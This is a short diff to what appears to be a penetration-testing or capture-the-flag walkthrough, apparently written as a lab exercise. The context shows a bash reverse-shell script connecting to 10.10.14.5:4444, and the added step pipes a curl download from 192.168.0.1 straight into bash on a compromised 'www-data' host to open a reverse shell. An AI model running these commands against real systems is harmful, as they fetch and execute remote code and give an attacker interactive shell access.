@@ -60,3 +60,8 @@ www-data@target:~$ curl 192.168.0.1/4444
 #!/bin/bash
 bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
 ```
+
+5.) Pipe payload to bash for reverse-shell
+```bash
+www-data@target:~$ curl 192.168.0.1/4444 | bash
+```
